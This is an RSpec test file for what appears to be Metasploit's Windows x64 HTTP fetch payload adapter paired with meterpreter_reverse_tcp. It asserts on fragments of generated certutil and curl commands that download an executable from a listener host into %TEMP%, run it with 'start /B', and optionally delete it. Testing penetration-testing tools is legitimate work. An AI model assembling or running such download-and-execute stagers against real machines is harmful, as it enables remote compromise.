require 'rspec'

RSpec.describe 'cmd/windows/http/x64' do
  include_context 'Msf::Simple::Framework#modules loading'

  # Adapter payloads cannot be instantiated standalone; they must be combined
  # with a compatible single payload. We use windows/x64/meterpreter_reverse_tcp
  # (ARCH_X64, Platform=win) so the adapter's generate_fetch_commands can be
  # exercised.
  let(:subject) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'cmd/windows/http/x64/meterpreter_reverse_tcp',
      ancestor_reference_names: [
        'adapters/cmd/windows/http/x64',
        'singles/windows/x64/meterpreter_reverse_tcp'
      ]
    )
  end

  let(:lhost) { '192.168.1.100' }
  let(:lport) { '4444' }
  let(:fetch_srvhost) { '192.168.1.100' }
  let(:fetch_srvport) { 8080 }
  let(:fetch_uripath) { 'testpayload' }
  let(:fetch_command) { 'CERTUTIL' }
  let(:fetch_filename) { 'payload' }
  let(:fetch_writable_dir) { '%TEMP%' }

  let(:datastore_values) do
    {
      'LHOST' => lhost,
      'LPORT' => lport,
      'FETCH_SRVHOST' => fetch_srvhost,
      'FETCH_SRVPORT' => fetch_srvport,
      'FETCH_URIPATH' => fetch_uripath,
      'FETCH_COMMAND' => fetch_command,
      'FETCH_FILENAME' => fetch_filename,
      'FETCH_WRITABLE_DIR' => fetch_writable_dir
    }
  end

  before(:each) do
    subject.datastore.merge!(datastore_values)
  end

  describe 'module metadata' do
    it 'includes HTTP Fetch in the name' do
      expect(subject.name).to include('HTTP Fetch')
    end

    it 'targets the Windows platform' do
      expect(subject.platform.platforms).to include(Msf::Module::Platform::Windows)
    end

    it 'uses CMD arch' do
      expect(subject.arch).to include(ARCH_CMD)
    end

    it 'adapts x64 payloads' do
      expect(subject.send(:module_info)['AdaptedArch']).to eq(ARCH_X64)
    end

    it 'has win as the adapted platform' do
      expect(subject.send(:module_info)['AdaptedPlatform']).to eq('win')
    end

    it 'adapts x64 and not x86 payloads' do
      expect(subject.send(:module_info)['AdaptedArch']).not_to eq(ARCH_X86)
    end
  end

  describe 'FETCH_COMMAND option' do
    it 'defaults to CERTUTIL' do
      fresh_subject = load_and_create_module(
        module_type: 'payload',
        reference_name: 'cmd/windows/http/x64/meterpreter_reverse_tcp',
        ancestor_reference_names: [
          'adapters/cmd/windows/http/x64',
          'singles/windows/x64/meterpreter_reverse_tcp'
        ]
      )
      expect(fresh_subject.datastore['FETCH_COMMAND']).to eq('CERTUTIL')
    end

    it 'accepts CURL as a valid value' do
      expect(subject.options['FETCH_COMMAND'].valid?('CURL')).to be(true)
    end

    it 'rejects TFTP as an invalid value' do
      expect(subject.options['FETCH_COMMAND'].valid?('TFTP')).to be(false)
    end

    it 'accepts CERTUTIL as a valid value' do
      expect(subject.options['FETCH_COMMAND'].valid?('CERTUTIL')).to be(true)
    end

    it 'rejects WGET as an invalid value' do
      expect(subject.options['FETCH_COMMAND'].valid?('WGET')).to be(false)
    end

    it 'rejects FTP as an invalid value' do
      expect(subject.options['FETCH_COMMAND'].valid?('FTP')).to be(false)
    end
  end

  describe '#generate_fetch_commands' do
    context 'with CERTUTIL (default)' do
      let(:fetch_command) { 'CERTUTIL' }

      it 'generates a certutil download command over HTTP' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('certutil -urlcache -f http://')
      end

      it 'includes the fetch server host and port in the URL' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include("#{fetch_srvhost}:#{fetch_srvport}")
      end

      it 'includes the URI path in the download URL' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include(fetch_uripath)
      end

      it 'includes the remote destination path' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include("#{fetch_writable_dir}\\#{fetch_filename}.exe")
      end

      it 'executes the payload with start /B' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('start /B')
      end

      it 'does not include del when FETCH_DELETE is false' do
        subject.datastore['FETCH_DELETE'] = false
        cmd = subject.generate_fetch_commands
        expect(cmd).not_to include(' del ')
      end

      it 'includes del when FETCH_DELETE is true' do
        subject.datastore['FETCH_DELETE'] = true
        cmd = subject.generate_fetch_commands
        expect(cmd).to include(' del ')
      end
    end

    context 'with CURL' do
      let(:fetch_command) { 'CURL' }

      it 'generates a curl download command over HTTP' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('curl -so')
        expect(cmd).to include("http://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}")
      end

      it 'includes the remote destination path' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include("#{fetch_writable_dir}\\#{fetch_filename}.exe")
      end

      it 'executes the payload with start /B' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('start /B')
      end
    end

  end

  describe '#fetch_protocol' do
    it 'returns HTTP' do
      expect(subject.fetch_protocol).to eq('HTTP')
    end
  end

  describe '#windows?' do
    it 'returns true for this Windows platform module' do
      expect(subject.windows?).to be(true)
    end
  end
end
